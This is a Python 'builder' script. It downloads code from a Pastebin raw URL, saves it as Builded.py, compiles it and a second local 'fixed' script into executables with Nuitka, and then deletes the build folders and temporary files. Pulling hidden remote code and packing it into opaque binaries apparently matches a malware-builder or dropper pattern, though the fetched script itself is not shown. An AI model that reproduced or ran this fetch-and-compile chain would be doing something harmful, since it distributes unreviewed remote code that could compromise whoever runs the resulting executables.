import os,time,requests,shutil

os.system("pip install requests")
os.system("pip install nuitka")
os.system("pip install shutil")

os.system("title BUILDER")
os.system("cls")

print("Building...")
time.sleep(2)

def get_script_from_pastebin(pastebin_url):
    try:
        response = requests.get(pastebin_url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error fetching script from Pastebin: {e}")
        return None

def create_python_script(file_path, script_content):
    with open(file_path, 'w') as file:
        file.write(script_content)

if __name__ == "__main__":
    pastebin_url = "https://pastebin.com/raw/gqPB8Xrk"
    script_content = get_script_from_pastebin(pastebin_url)
    if script_content:
        file_path = "Builded.py"
        create_python_script(file_path, script_content)
        
os.system("cls")

print("\033[91mWARNING: RECOMENDED TO USE FIXED SCRIPT!!\033[91m")
time.sleep(3)

os.system("python -m nuitka --mingw64 Builded.py")
os.system("cls")
print("\033[91mWARNING: RECOMENDED TO USE FIXED SCRIPT!!\033[91m")
time.sleep(3)
os.system("python -m nuitka --mingw64 FIXED_SCRIPT_(recomended-to-use)\ctmd_fixed.py")
os.system("cls")

print("Clearing temp files...")
time.sleep(1)

builded_folder = "Builded.build"

shutil.rmtree(builded_folder, ignore_errors=True)

cmtd_fixed_folder = "ctmd_fixed.build"

shutil.rmtree(cmtd_fixed_folder, ignore_errors=True)

temp_file1 = "Builded.cmd"
temp_file2 = "ctmd_fixed.cmd"

os.remove(temp_file1)
os.remove(temp_file2)

os.system("cls")

print("finished, now you can exit!")
print("\033[91mWARNING: RECOMENDED TO USE FIXED SCRIPT!!\033[91m")
time.sleep(10)
